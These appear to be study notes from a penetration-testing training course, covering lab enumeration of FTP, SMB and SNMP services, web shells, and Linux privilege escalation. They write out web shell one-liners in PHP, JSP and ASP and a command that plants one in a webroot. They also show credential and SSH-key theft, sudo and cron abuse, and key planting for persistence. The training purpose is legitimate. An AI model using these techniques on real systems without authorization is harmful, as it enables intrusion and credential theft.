## Penetration Tester Path Syllabus

The path simulates a penetration test against the company Inlanefreight broken down into various stages, covering the core concepts and tools that will make us stand out as penetration testers. The path culminates in an in-depth module on critical soft skills such as notetaking, organization, documentation, reporting, and client communication, and then a full-blown mock penetration test to practice all of our skills in one large, simulated company network. The modules that comprise the path are laid out as follows:

|**`Introduction`**|
|---|
|1. [Penetration Testing Process](https://academy.hackthebox.com/module/details/90)|
|2. [Getting Started](https://academy.hackthebox.com/module/details/77)|

|**`Reconnaissance, Enumeration & Attack Planning`**|
|---|
|3. [Network Enumeration with Nmap](https://academy.hackthebox.com/module/details/19)|
|4. [Footprinting](https://academy.hackthebox.com/module/details/112)|
|5. [Information Gathering - Web Edition](https://academy.hackthebox.com/module/details/144)|
|6. [Vulnerability Assessment](https://academy.hackthebox.com/module/details/108)|
|7. [File Transfers](https://academy.hackthebox.com/module/details/24)|
|8. [Shells & Payloads](https://academy.hackthebox.com/module/details/115)|
|9. [Using the Metasploit Framework](https://academy.hackthebox.com/module/details/39)|

|**`Exploitation & Lateral Movement`**|
|---|
|10. [Password Attacks](https://academy.hackthebox.com/module/details/147)|
|11. [Attacking Common Services](https://academy.hackthebox.com/module/details/116)|
|12. [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158)|
|13. [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143)|

|**`Web Exploitation`**|
|---|
|14. [Using Web Proxies](https://academy.hackthebox.com/module/details/110)|
|15. [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54)|
|16. [Login Brute Forcing](https://academy.hackthebox.com/module/details/57)|
|17. [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33)|
|18. [SQLMap Essentials](https://academy.hackthebox.com/module/details/58)|
|19. [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/details/103)|
|20. [File Inclusion](https://academy.hackthebox.com/module/details/23)|
|21. [File Upload Attacks](https://academy.hackthebox.com/module/details/136)|
|22. [Command Injections](https://academy.hackthebox.com/module/details/109)|
|23. [Web Attacks](https://academy.hackthebox.com/module/details/134)|
|24. [Attacking Common Applications](https://academy.hackthebox.com/module/details/113)|

|**`Post-Exploitation`**|
|---|
|25. [Linux Privilege Escalation](https://academy.hackthebox.com/module/details/51)|
|26. [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67)|

|**`Reporting & Capstone`**|
|---|
|27. [Documentation & Reporting](https://academy.hackthebox.com/module/details/162)|
|28. [Attacking Enterprise Networks](https://academy.hackthebox.com/module/details/163)|

![](https://academy.hackthebox.com/storage/modules/90/0-PT-Process.png)

---
## Testing Methods

An essential part of the process is the starting point from which we should perform our pentest. Each pentest can be performed from two different perspectives:

- `External` or `Internal`

#### External Penetration Test

Many pentests are performed from an external perspective or as an anonymous user on the Internet. Most customers want to ensure that they are as protected as possible against attacks on their external network perimeter. We can perform testing from our own host (hopefully using a VPN connection to avoid our ISP blocking us) or from a VPS. Some clients will not care about stealth, while others will request that we proceed as quietly as possible and approach the target systems to avoid being banned by the firewalls and IDS/IPS systems and avoid triggering an alarm. They may ask for a stealthy or "hybrid" approach where we gradually become "noisier" to test their detection capabilities. Ultimately our goal here is to access external-facing hosts, obtain sensitive data, or gain access to the internal network.

#### Internal Penetration Test

In contrast to an external pentest, an internal pentest is when we perform testing from within the corporate network. This stage may be executed after successfully penetrating the corporate network via the external pentest or starting from an assumed breach scenario. Internal pentests may also access isolated systems with no internet access whatsoever, which usually requires our physical presence at the client's facility.

---

## Types of Penetration Testing

No matter how we begin the pentest, the type of pentest plays an important role. This type determines how much information is made available to us. We can narrow down these types to the following:

|**Type**|**Information Provided**|
|---|---|
|`Blackbox`|`Minimal`. Only the essential information, such as IP addresses and domains, is provided.|
|`Greybox`|`Extended`. In this case, we are provided with additional information, such as specific URLs, hostnames, subnets, and similar.|
|`Whitebox`|`Maximum`. Here everything is disclosed to us. This gives us an internal view of the entire structure, which allows us to prepare an attack using internal information. We may be given detailed configurations, admin credentials, web application source code, etc.|
|`Red-Teaming`|May include physical testing and social engineering, among other things. Can be combined with any of the above types.|
|`Purple-Teaming`|It can be combined with any of the above types. However, it focuses on working closely with the defenders.|

## Types of Testing Environments

Apart from the test method and the type of test, another consideration is what is to be tested, which can be summarized in the following categories:

|---|---|
| --- | ---  | --- | --- | --- |
|Network|Web App|Mobile|API|Thick Clients|
|IoT|Cloud|Source Code|Physical Security|Employees|
|Hosts|Server|Security Policies|Firewalls|IDS/IPS|

## Post-Remediation Testing

Most engagements include post-remediation testing as part of the project's total cost. In this phase, we will review any documentation provided by the client showing evidence of remediation or just a list of remediated findings. We will need to reaccess the target environment and test each issue to ensure it was appropriately remediated. We will issue a post-remediation report that clearly shows the state of the environment before and after post-remediation testing. For example, we may include a table such as:

|#|Finding Severity|Finding Title|Status|
|---|---|---|---|
|1|High|SQL Injection|Remediated|
|2|High|Broken Authentication|Remediated|
|3|High|Unrestricted File Upload|Remediated|
|4|High|Inadequate Web and Egress Filtering|Not Remediated|
|5|Medium|SMB Signing Not Enabled|Not Remediated|
|6|Low|Directory Listing Enabled|Not Remediated|

## What is a Shell?

`Shell` is a very common term that we will hear again and again during our journey. It has a few meanings. On a Linux system, the shell is a program that takes input from the user via the keyboard and passes these commands to the operating system to perform a specific function. In the early days of computing, the shell was the only interface available for interacting with systems. Since then, many more operating system types and versions have emerged along with the graphic user interface (GUI) to complement command-line interfaces (shell), such as the Linux terminal, Windows command-line (cmd.exe), and Windows PowerShell.

Most Linux systems use a program called [Bash (Bourne Again Shell)](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html) as a shell program to interact with the operating system. Bash is an enhanced version of [sh](https://man7.org/linux/man-pages/man1/sh.1p.html), the Unix systems' original shell program. Aside from `bash` there are also other shells, including but not limited to [Zsh](https://en.wikipedia.org/wiki/Z_shell), [Tcsh](https://en.wikipedia.org/wiki/Tcsh), [Ksh](https://en.wikipedia.org/wiki/KornShell), [Fish shell](https://en.wikipedia.org/wiki/Fish_(Unix_shell)), etc.

We will often read about or hear others talking about "getting a shell" on a box (system). This means that the target host has been exploited, and we have obtained shell-level access (typically `bash` or `sh`) and can run commands interactively as if we are sitting logged in to the host. A shell may be obtained by exploiting a web application or network/service vulnerability or obtaining credentials and logging into the target host remotely. There are three main types of shell connections:

|**Shell Type**|**Description**|
|---|---|
|`Reverse shell`|Initiates a connection back to a "listener" on our attack box.|
|`Bind shell`|"Binds" to a specific port on the target host and waits for a connection from our attack box.|
|`Web shell`|Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a `PHP` script to run a single command.|

|Port(s)|Protocol|
|---|---|
|`20`/`21` (TCP)|`FTP`|
|`22` (TCP)|`SSH`|
|`23` (TCP)|`Telnet`|
|`25` (TCP)|`SMTP`|
|`80` (TCP)|`HTTP`|
|`161` (TCP/UDP)|`SNMP`|
|`389` (TCP/UDP)|`LDAP`|
|`443` (TCP)|`SSL`/`TLS` (`HTTPS`)|
|`445` (TCP)|`SMB`|
|`3389` (TCP)|`RDP`|

|Number|Category|Description|
|---|---|---|
|1.|[Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)|Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.|
|2.|[Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)|Failures related to cryptography which often leads to sensitive data exposure or system compromise.|
|3.|[Injection](https://owasp.org/Top10/A03_2021-Injection/)|User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc.|
|4.|[Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)|These issues happen when the application is not designed with security in mind.|
|5.|[Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)|Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information.|
|6.|[Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)|Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.|
|7.|[Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)|Authentication-related attacks that target user's identity, authentication, and session management.|
|8.|[Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)|Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs).|
|9.|[Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)|This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..|
|10.|[Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)|SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).|

## Attacking Network Services

#### Banner Grabbing

As previously discussed, banner grabbing is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner once a connection is initiated. Nmap will attempt to grab the banners if the syntax `nmap -sV --script=banner <target>` is specified. We can also attempt this manually using `Netcat`. Let us take another example, using the `nc` version of `Netcat`:

  Banner Grabbing

```shell
Pwn1Sec@htb[/htb]$ nc -nv 10.129.42.253 21

(UNKNOWN) [10.129.42.253] 21 (ftp) open
220 (vsFTPd 3.0.3)
```

This reveals that the version of `vsFTPd` on the server is `3.0.3`. We can also automate this process using `Nmap's` powerful scripting engine: `nmap -sV --script=banner -p21 10.10.10.0/24`.

#### FTP

It is worth gaining familiarity with FTP, as it is a standard protocol, and this service can often contain interesting data. A `Nmap` scan of the default port for FTP (21) reveals the vsftpd 3.0.3 installation that we identified previously. Further, it also reports that anonymous authentication is enabled and that a `pub` directory is available.

  FTP

```shell
Pwn1Sec@htb[/htb]$ nmap -sC -sV -p21 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 00:54 GMT
Nmap scan report for 10.129.42.253
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 19 23:50 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
```

Let us connect to the service using the `ftp` command-line utility.

  FTP

```shell
Pwn1Sec@htb[/htb]$ ftp -p 10.129.42.253

Connected to 10.129.42.253.
220 (vsFTPd 3.0.3)
Name (10.129.42.253:user): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
227 Entering Passive Mode (10,129,42,253,158,60).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
226 Directory send OK.

ftp> cd pub
250 Directory successfully changed.

ftp> ls
227 Entering Passive Mode (10,129,42,253,182,129).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            18 Feb 25 19:25 login.txt
226 Directory send OK.

ftp> get login.txt
local: login.txt remote: login.txt
227 Entering Passive Mode (10,129,42,253,181,53).
150 Opening BINARY mode data connection for login.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (165.8314 kB/s)
```

#### SMB

SMB (Server Message Block) is a prevalent protocol on Windows machines that provides many vectors for vertical and lateral movement. Sensitive data, including credentials, can be in network file shares, and some SMB versions may be vulnerable to RCE exploits such as [EternalBlue](https://www.avast.com/c-eternalblue). It is crucial to enumerate this sizeable potential attack surface carefully. `Nmap` has many scripts for enumerating SMB, such as [smb-os-discovery.nse](https://nmap.org/nsedoc/scripts/smb-os-discovery.html), which will interact with the SMB service to extract the reported operating system version.

  SMB

```shell
Pwn1Sec@htb[/htb]$ nmap --script smb-os-discovery.nse -p445 10.10.10.40

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
Nmap scan report for doctors.htb (10.10.10.40)
Host is up (0.022s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: CEO-PC
|   NetBIOS computer name: CEO-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-27T00:59:46+00:00

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```

In this case, the host runs a legacy Windows 7 OS, and we could conduct further enumeration to confirm if it is vulnerable to EternalBlue. The Metasploit Framework has several [modules](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) for EternalBlue that can be used to validate the vulnerability and exploit it, as we will see in a coming section. We can run a scan against our target for this module section to gather information from the SMB service. We can ascertain that the host runs a Linux kernel, Samba version 4.6.2, and the hostname is GS-SVCSCAN.

  SMB

```shell
Pwn1Sec@htb[/htb]$ nmap -A -p445 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-25T21:30:06
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   111.62 ms 10.10.14.1
2   111.89 ms 10.129.42.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```

---

#### Shares

SMB allows users and administrators to share folders and make them accessible remotely by other users. Often these shares have files in them that contain sensitive information such as passwords. A tool that can enumerate and interact with SMB shares is [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). The `-L` flag specifies that we want to retrieve a list of available shares on the remote host, while `-N` suppresses the password prompt.

  Shares

```shell
Pwn1Sec@htb[/htb]$ smbclient -N -L \\\\10.129.42.253

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	users           Disk      
	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

This reveals the non-default share `users`. Let us attempt to connect as the guest user.

  Shares

```shell
Pwn1Sec@htb[/htb]$ smbclient \\\\10.129.42.253\\users

Enter WORKGROUP\users's password: 
Try "help" to get a list of possible commands.

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

smb: \> exit
```

The `ls` command resulted in an access denied message, indicating that guest access is not permitted. Let us try again using credentials for the user bob (`bob:Welcome1`).

  Shares

```shell
Pwn1Sec@htb[/htb]$ smbclient -U bob \\\\10.129.42.253\\users

Enter WORKGROUP\bob's password: 
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 15:05:31 2021
  bob                                 D        0  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available
		
smb: \> cd bob

smb: \bob\> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 16:42:23 2021
  passwords.txt                       N      156  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available
		
smb: \bob\> get passwords.txt 
getting file \bob\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

We successfully gained access to the `users` share using credentials and gained access to the interesting file `passwords.txt`, which can be downloaded with the `get` command.

#### SNMP

SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of `public` and `private` are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.

  SNMP

```shell
Pwn1Sec@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
```

  SNMP

```shell
Pwn1Sec@htb[/htb]$ snmpwalk -v 2c -c private  10.129.42.253 

Timeout: No Response from 10.129.42.253
```

A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.

  SNMP

```shell
Pwn1Sec@htb[/htb]$ onesixtyone -c dict.txt 10.129.42.254

Scanning 1 hosts, 51 communities
10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
```

#### Robots.txt

It is common for websites to contain a `robots.txt` file, whose purpose is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. In this case, we see that the `robots.txt` file contains two disallowed entries.

![phpinfo](https://academy.hackthebox.com/storage/modules/77/robots.png)

#### Upgrading TTY

Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.

There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:

```shell
Pwn1Sec@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:

```shell
www-data@remotehost$ ^Z

Pwn1Sec@htb[/htb]$ stty raw -echo
Pwn1Sec@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

## Web Shell

The final type of shell we have is a `Web Shell`. A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.

#### Writing a Web Shell

First of all, we need to write our web shell that would take our command through a `GET` request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:

Code: php

```php
<?php system($_REQUEST["cmd"]); ?>
```

Code: jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

Code: asp

```asp
<% eval request("cmd") %>
```

#### Uploading a Web Shell

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. `shell.php` and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:

Code: bash

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

---
#### Accessing Web Shell

Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

![](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

Another option is to use `cURL`:

```shell
Pwn1Sec@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Privilege Escalation

---

Our initial access to a remote server is usually in the context of a low-privileged user, which would not give us complete access over the box. To gain full access, we will need to find an internal/local vulnerability that would escalate our privileges to the `root` user on `Linux` or the `administrator`/`SYSTEM` user on `Windows`. Let us walk through some common methods of escalating our privileges.

---

## PrivEsc Checklists

Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is [HackTricks](https://book.hacktricks.xyz/), which has an excellent checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation. Another excellent repository is [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), which also has checklists for both [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) and [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md). We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.

---

## Enumeration Scripts

Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include [LinEnum](https://github.com/rebootuser/LinEnum.git) and [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), and for Windows include [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS).

Another useful tool we may use for server enumeration is the [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.

Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.

Let us take an example of running the Linux script from `PEASS` called `LinPEAS`:

```shell
Pwn1Sec@htb[/htb]$ ./linpeas.sh
...SNIP...

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 3.9.0-73-generic
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...SNIP...
```

As we can see, once the script runs, it starts collecting information and displaying it in an excellent report. Let us discuss some of the vulnerabilities that we should look for in the output from these scripts.

---

## Kernel Exploits

Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist. Suppose the server is not being maintained with the latest updates and patches. In that case, it is likely vulnerable to specific kernel exploits found on unpatched versions of Linux and Windows.

For example, the above script showed us the Linux version to be `3.9.0-73-generic`. If we Google exploits for this version or use `searchsploit`, we would find a `CVE-2016-5195`, otherwise known as `DirtyCow`. We can search for and download the [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) exploit and run it on the server to gain root access.

The same concept also applies to Windows, as there are many vulnerabilities in unpatched/older versions of Windows, with various vulnerabilities that can be used for privilege escalation. We should keep in mind that kernel exploits can cause system instability, and we should take great care before running them on production systems. It is best to try them in a lab environment and only run them on production systems with explicit approval and coordination with our client.

---

## Vulnerable Software

Another thing we should look for is installed software. For example, we can use the `dpkg -l` command on Linux or look at `C:\Program Files` in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.

---

## User Privileges

Another critical aspect to look for after gaining access to a server is the privileges available to the user we have access to. Suppose we are allowed to run specific commands as root (or as another user). In that case, we may be able to escalate our privileges to root/system users or gain access as a different user. Below are some common ways to exploit certain user privileges:

1. Sudo
2. SUID
3. Windows Token Privileges

The `sudo` command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. This is generally done as specific commands can only be run as root 'like `tcpdump`' or allow the user to access certain root-only directories. We can check what `sudo` privileges we have with the `sudo -l` command:

```shell
Pwn1Sec@htb[/htb]$ sudo -l

[sudo] password for user1:
...SNIP...

User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
```

The above output says that we can run all commands with `sudo`, which gives us complete access, and we can use the `su` command with `sudo` to switch to the root user:

```shell
Pwn1Sec@htb[/htb]$ sudo su -

[sudo] password for user1:
whoami
root
```

The above command requires a password to run any commands with `sudo`. There are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password:

```shell
Pwn1Sec@htb[/htb]$ sudo -l

    (user : user) NOPASSWD: /bin/echo
```

The `NOPASSWD` entry shows that the `/bin/echo` command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says `user`, we can run `sudo` as that user and not as root. To do so, we can specify the user with `-u user`:

```shell
Pwn1Sec@htb[/htb]$ sudo -u user /bin/echo Hello World!

    Hello World!
```

Once we find a particular application we can run with `sudo`, we can look for ways to exploit it to get a shell as the root user. [GTFOBins](https://gtfobins.github.io/) contains a list of commands and how they can be exploited through `sudo`. We can search for the application we have `sudo` privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the `sudo` privilege we have.

[LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.

---

## Scheduled Tasks

In both Linux and Windows, there are methods to have scripts run at specific intervals to carry out a task. Some examples are having an anti-virus scan running every hour or a backup script that runs every 30 minutes. There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:

1. Add new scheduled tasks/cron jobs
2. Trick them to execute a malicious software

The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through `Cron Jobs`. There are specific directories that we may be able to utilize to add new cron jobs if we have the `write` permissions over them. These include:

1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`

If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.

---

## Exposed Credentials

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us, as below:

```shell
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```

As we can see, the database password '`password123`' is exposed, which would allow us to log in to the local `mysql` databases and look for interesting information. We may also check for `Password Reuse`, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user, as follows:

```shell
Pwn1Sec@htb[/htb]$ su -

Password: password123
whoami

root
```

We may also use the user credentials to `ssh` into the server as that user.

---

## SSH Keys

Finally, let us discuss SSH keys. If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:

```shell
Pwn1Sec@htb[/htb]$ vim id_rsa
Pwn1Sec@htb[/htb]$ chmod 600 id_rsa
Pwn1Sec@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa

root@remotehost#
```

Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.

If we find ourselves with write access to a users`/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:

```shell
Pwn1Sec@htb[/htb]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```

This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:

```shell
